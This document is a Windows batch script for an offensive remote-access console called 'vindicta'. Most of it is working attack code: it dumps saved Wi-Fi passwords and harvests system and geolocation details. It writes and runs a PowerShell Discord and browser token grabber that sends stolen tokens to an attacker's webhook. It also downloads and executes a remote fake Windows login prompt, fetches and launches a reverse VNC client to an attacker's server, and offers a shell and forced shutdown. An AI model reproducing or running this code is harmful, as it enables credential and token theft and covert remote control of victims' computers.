@echo off
chcp 65001 >nul
FOR /F "tokens=4 delims= " %%a in ('route print ^| find " 0.0.0.0"') do set localip=%%a
echo.
:input
cd %homepath%
set input=" "
set /p input="vindicta > "

if /I "%input%" EQU "help" (
echo.
echo   Information            Description        
echo    ---------            -------------       
echo   getinfo         Displays System Info      
echo   geolocate       Displays Geolocation Info 
echo   users           Displays System Users     
echo.
echo     Password             Description        
echo    ----------           -------------       
echo   wifipass        Displays Wifi Passwords   
echo   tokengrab       Discord Token Grabber     
echo   winphish        Windows Password Phish    
echo.
echo     Control              Description        
echo    ---------            -------------       
echo   shell           Remote Shell              
echo   vncinject       Injects Reverse Vnc       
echo   msg             Sends MessageBox          
echo   website         Visits Website            
echo   shutdown        System Shutdown           
echo.
goto input
)

if /I "%input%" EQU "website" (
goto website
)

if /I "%input%" EQU "shutdown" (
set /p shutdownmsg=Shutdown Message: 
shutdown /s /t 5 /c "%shutdownmsg%"
)

if /I "%input%" EQU "vncinject" (
goto vncinject
)

if /I "%input%" EQU "msg" (
goto msg
)

if /I "%input%" EQU "exit" (
exit
)

if /I "%input%" EQU "winphish" (
echo.
echo Waiting for User Input...
goto winphish
)

if /I "%input%" EQU "getinfo" (
goto getinfo
)

if /I "%input%" EQU "shell" (
call cmd.exe
goto input
)

if /I "%input%" EQU "geolocate" (
goto geolocate
)

if /I "%input%" EQU "users" (
net user | findstr /v "The command completed successfully."
goto input
)

if /I "%input%" EQU "tokengrab" (
goto tokengrab
)

if /I "%input%" EQU "wifipass" (
goto wifipass
)

) else (
echo Invalid Command.
echo.
goto input
)

goto input

:vncinject
chcp 437 >nul
set /p vncip=Vnc Server IP: 
set /p vncport=Vnc Port: 
if not exist C:\ProgramData mkdir C:\ProgramData >nul
powershell (New-Object Net.WebClient).DownloadFile('https://github.com/syskey-del/svchost/raw/main/winvnc.exe','C:\ProgramData\winvnc.exe')
powershell (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/syskey-del/svchost/main/UltraVNC.ini','C:\ProgramData\UltraVNC.ini')
:vncwait
ping localhost -n 3 >nul
if not exist C:\ProgramData\winvnc.exe goto vncwait
if not exist C:\ProgramData\UltraVNC.ini goto vncwait
powershell -command C:\ProgramData\winvnc.exe -run
powershell -command C:\ProgramData\winvnc.exe -connect %vncip%::%vncport%
set /p null=Press any Key to Continue...
taskkill /im winvnc.exe /f
ping localhost -n 2 >nul
del C:\ProgramData\winvnc.exe
del C:\ProgramData\UltraVNC.ini
echo.
chcp 65001 >nul
goto input

:wifipass
echo.
for /F "tokens=2 delims=:" %%a in ('netsh wlan show profile') do (
    set wifi_pwd=
    for /F "tokens=2 delims=: usebackq" %%F IN (`netsh wlan show profile %%a key^=clear ^| find "Key Content"`) do (
        echo %%a: %%F
    )
)
echo.
goto input

goto input

:geolocate
setlocal enabledelayedexpansion
curl -s ifconfig.me/ip>>%appdata%\Debug.txt
set /p ip=<%appdata%\Debug.txt
curl -s http://ipinfo.io/%ip%/json>>%appdata%\Publish.txt

for /f "tokens=* delims= " %%X in (%appdata%\Publish.txt) DO (
    set line=%%X
    set line=!line:"=!
    echo  !line!>>%appdata%\Release.txt
)
endlocal

echo.
echo   Geolocation
echo  -------------
type %appdata%\Release.txt | findstr /v "{" | findstr /v "}" | findstr /v "readme"
echo.
del %appdata%\Release.txt
del %appdata%\Publish.txt
del %appdata%\Debug.txt
goto input

goto input

:tokengrab
cd %appdata%
if exist Update.ps1 del /s /q Update.ps1 >nul
set /p webhook=Webhook URL: 
echo $hook  = "%webhook%">>Update.ps1
echo $token = new-object System.Collections.Specialized.StringCollection>>Update.ps1
echo Stop-Process -Name "Discord" -Force>>Update.ps1
echo. >>Update.ps1
echo $db_path = @(>>Update.ps1
echo     $env:APPDATA + "\Discord\Local Storage\leveldb">>Update.ps1
echo     $env:APPDATA + "\Roaming\Discord\Local Storage\leveldb">>Update.ps1
echo     $env:APPDATA + "\Roaming\Lightcord\Local Storage\leveldb">>Update.ps1
echo     $env:APPDATA + "\Roaming\discordptb\Local Storage\leveldb">>Update.ps1
echo     $env:APPDATA + "\Roaming\discordcanary\Local Storage\leveldb">>Update.ps1
echo     $env:APPDATA + "\Roaming\Opera Software\Opera Stable\Local Storage\leveldb">>Update.ps1
echo     $env:APPDATA + "\Roaming\Opera Software\Opera GX Stable\Local Storage\leveldb">>Update.ps1
echo. >>Update.ps1
echo     $env:APPDATA + "\Local\Amigo\User Data\Local Storage\leveldb">>Update.ps1
echo     $env:APPDATA + "\Local\Torch\User Data\Local Storage\leveldb">>Update.ps1
echo     $env:APPDATA + "\Local\Kometa\User Data\Local Storage\leveldb">>Update.ps1
echo     $env:APPDATA + "\Local\Orbitum\User Data\Local Storage\leveldb">>Update.ps1
echo     $env:APPDATA + "\Local\CentBrowser\User Data\Local Storage\leveldb">>Update.ps1
echo     $env:APPDATA + "\Local\7Star\7Star\User Data\Local Storage\leveldb">>Update.ps1
echo     $env:APPDATA + "\Local\Sputnik\Sputnik\User Data\Local Storage\leveldb">>Update.ps1
echo     $env:APPDATA + "\Local\Vivaldi\User Data\Default\Local Storage\leveldb">>Update.ps1
echo     $env:APPDATA + "\Local\Google\Chrome SxS\User Data\Local Storage\leveldb">>Update.ps1
echo     $env:APPDATA + "\Local\Epic Privacy Browser\User Data\Local Storage\leveldb">>Update.ps1
echo     $env:APPDATA + "\Local\Google\Chrome\User Data\Default\Local Storage\leveldb">>Update.ps1
echo     $env:APPDATA + "\Local\uCozMedia\Uran\User Data\Default\Local Storage\leveldb">>Update.ps1
echo     $env:APPDATA + "\Local\Microsoft\Edge\User Data\Default\Local Storage\leveldb">>Update.ps1
echo     $env:APPDATA + "\Local\Yandex\YandexBrowser\User Data\Default\Local Storage\leveldb">>Update.ps1
echo     $env:APPDATA + "\Local\Opera Software\Opera Neon\User Data\Default\Local Storage\leveldb">>Update.ps1
echo     $env:APPDATA + "\Local\BraveSoftware\Brave-Browser\User Data\Default\Local Storage\leveldb">>Update.ps1
echo )>>Update.ps1
echo. >>Update.ps1
echo foreach ($path in $db_path) {>>Update.ps1
echo     if (Test-Path $path) {>>Update.ps1
echo         foreach ($file in Get-ChildItem -Path $path -Name) {>>Update.ps1
echo             $data = Get-Content -Path "$($path)\$($file)">>Update.ps1
echo             $regex = [regex] "[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}">>Update.ps1
echo             $match = $regex.Match($data)>>Update.ps1
echo. >>Update.ps1
echo            while ($match.Success) {>>Update.ps1
echo                 if (!$token.Contains($match.Value)) {>>Update.ps1
echo                     $token.Add($match.Value) ^| out-null>>Update.ps1
echo                 }>>Update.ps1
echo. >>Update.ps1
echo                $match = $match.NextMatch()>>Update.ps1
echo             }>>Update.ps1
echo         }>>Update.ps1
echo     }>>Update.ps1
echo }>>Update.ps1
echo >>Update.ps1
echo $content = "**Client: %localip%**``` ">>Update.ps1
echo foreach ($data in $token) {>>Update.ps1
echo     $content = [string]::Concat($content, "`n", $data)>>Update.ps1
echo }>>Update.ps1
echo $content = [string]::Concat($content, "``` ")>>Update.ps1
echo >>Update.ps1
echo $JSON = @{ "content"= $content; "username"= "Vindicta"; "avatar_url"= "https://wallpapercave.com/wp/wp8715191.jpg" }  ^| convertto-json>>Update.ps1
echo Invoke-WebRequest -uri $hook -Method POST -Body $JSON -Headers @{"Content-Type" = "application/json"}>>Update.ps1
cd %homepath%
chcp 437 >nul
powershell.exe -executionpolicy unrestricted "%appdata%\Update.ps1" >nul 2>&1 && del %appdata%\Update.ps1
chcp 65001 >nul
goto input

goto input

:winphish
chcp 437 >nul
powershell.exe -ep Bypass -c IEX ((New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/enigma0x3/Invoke-LoginPrompt/master/Invoke-LoginPrompt.ps1')); Invoke-LoginPrompt
chcp 65001 >nul
goto input

goto input

:getinfo
curl -s ifconfig.me/ip>>%appdata%\Debug.txt
:infowait
ping localhost -n 1 >nul
if not exist %appdata%\Debug.txt goto infowait
set /p publicip=<%appdata%\Debug.txt
del %appdata%\Debug.txt
FOR /F "tokens=2 delims=:" %%a in ('systeminfo ^| find "Registered Owner"') do set owner=%%~a
FOR /F "tokens=2 delims=:" %%a in ('systeminfo ^| find "OS Name"') do set osname=%%~a
FOR /F "tokens=2 delims=:" %%a in ('systeminfo ^| find "System Manufacturer"') do set manufacture=%%~a
set owner=%owner: =%
set osname=%osname:~19%
set manufacture=%manufacture:~7%
echo.
echo Username: %username%
echo Hostname: %computername%
echo OS: %osname%
echo Owner: %owner%
echo Local IP: %localip%
echo Public IP: %publicip%
echo Manufacturer: %manufacture%
echo.
goto input

goto input

:msg
set /p msgtitle=Title: 
set /p msgmsg=Message: 
set /p msgicon=Icon (Information, Error, Warning): 
chcp 437 >nul
powershell -Command "& {Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.MessageBox]::Show('%msgmsg%', '%msgtitle%', 'OK', [System.Windows.Forms.MessageBoxIcon]::%msgicon%);}"
chcp 65001 >nul
echo.
goto input

goto input

:website
set /p websiteurl=URL to Visit: 
start %websiteurl%
echo.
goto input
